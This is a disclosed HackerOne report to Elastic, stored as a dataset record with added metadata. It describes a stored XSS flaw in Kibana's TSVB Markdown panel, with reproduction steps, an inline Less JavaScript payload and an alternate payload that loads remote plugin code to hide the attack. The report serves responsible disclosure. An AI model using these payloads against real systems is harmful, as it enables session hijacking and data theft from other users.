{
    "reported_to": "Elastic",
    "reported_by": "jeremybuis ",
    "title": "Stored XSS in TSVB Visualizations Markdown Panel",
    "content": "\nNOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\nSummary: An authenticated user can save a TSVB visualization, which contains a stored cross-site scripting (XSS) payload in the included Less code as part of the markdown panel.\nDescription: I've found a stored cross-site scripting (XSS) issue in the TSVB visualization. The Markdown panel accepts Custom CSS and Less. The proof-of-concept attack below shows how to create an XSS using the Less language. By injecting a payload like: body { color: `confirm('XSS')`; } , a malicious user is able to gain JavaScript execution on the domain. When another authenticated user edits the Less code, the payload fires.\nSteps To Reproduce:\nI created an instance of Kibana on cloud.elastic.co and performed the following:\nLogin to Kibana and navigate to the visualizations page and click \"Create Visualization\"\nSelect TSVB\nNavigate to the Markdown tab\nNavigate to the Panel options sub tab\nPlace the following payload in the custom CSS editor: body { color: `confirm('XSS')`; }\nNotice the Confirm dialog\nSave the visualization\nAs another user, navigate to the visualizations custom css and edit the Less\nNotice the Confirm dialog\nA similar attack can be done on the demo.elastic.co Kibana instance as well. Heres a permalink to the example above: Demo Kibana Less XSS\nScenario\nA malicious user could create a scenario where the visualization is saved as part of a dashboard, and the processed CSS causes a problem with the view, inviting other users to try and fix the issue. When the other users try and fix the issue, they trigger the XSS payload. The malicious user could then perform actions as if the were the affected user, and potentially ex-filtrate sensitive data they didn't already have access too.\nAlternate Payload\nIf including malicious JavaScript in the Less code is too obvious, the malicious user can include a Less plugin instead. The Less code would look like the following:\nCode 41 Bytes\n1@plugin \"https://www.example.com/plugin\";\nNotice that the \".js\" extension is not needed, further obfuscating the attack. The plugin code would look like the following:\nCode 180 Bytes\n1confirm(\"XSS Less plugin\");\n2module.exports = {\n3  install: function(less, pluginManager, functions) {\n4    functions.add('xss', function(val) {\n5      return val.value;\n6    });\n7  }\n8};\nThis approach is less obvious compared to the inline JS, when an unsuspecting user tries to modify the Less code.\nImpact: XSS can be used to force users to download malware, navigate to malicious websites, or hijack users sessions. For Kibana, the vulnerability could allow an attacker to obtain sensitive information from or perform destructive actions on behalf of other Kibana users.\nRecommendations:\nUpgrade to Less version 3.0 or greater and confirm that the Less option { javascriptEnabled: false } is properly configured. This will fix the inline JavaScript execution problem.\nThere is no fix at the moment for the plugin syntax as far as I know. I will be communicating with the Less team shortly to see what can be done.\nSupporting Material/References:\nTwo screenshots showing both the inline JavaScript injection and the Less plugin option against the demo.elastic.co instance\nTwo screenshots showing both inline and plugin options against a deployment on https://cloud.elastic.co/\nMy example Less plugin\nImpact\nThe vulnerability could allow an attacker to obtain sensitive information from or perform destructive actions on behalf of other Kibana users\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": 0,
    "weaknesses": [
        "Cross-site Scripting (XSS) - Stored"
    ],
    "screenshots": {},
    "disclosed_date": 1595976780,
    "report_url": "https://hackerone.com/reports/858874",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Login to Kibana and navigate to the visualizations page and click 'Create Visualization'"
        ],
        [
            2,
            "Select TSVB"
        ],
        [
            3,
            "Navigate to the Markdown tab"
        ],
        [
            4,
            "Navigate to the Panel options sub tab"
        ],
        [
            5,
            "Place the payload in the custom CSS editor: body { color: `confirm('XSS')`; }"
        ],
        [
            6,
            "Save the visualization"
        ],
        [
            7,
            "As another user, navigate to the visualizations custom css and edit the Less"
        ],
        [
            8,
            "Notice the Confirm dialog"
        ]
    ],
    "vuln_description": "An authenticated user can save a TSVB visualization containing a stored XSS payload in the included Less code as part of the markdown panel. When another authenticated user edits the Less code, the payload fires, allowing JavaScript execution.",
    "reason": "The vulnerability involves understanding the Less language's ability to execute JavaScript and the interaction between custom CSS/Less code in Kibana's TSVB visualization. The attack requires knowledge of Less's features and how Kibana processes custom CSS/Less code, but the steps to exploit are straightforward once the initial insight is gained.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null,
    "authnz_metadata": {
        "reason": "The vulnerability involves stored XSS in the TSVB visualization's Markdown panel, which is triggered when another authenticated user interacts with the visualization. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, but does not specifically address XSS vulnerabilities that arise from injecting malicious code into stored content. Therefore, the described methodology would not detect this XSS vulnerability.",
        "is_detectable": false
    }
}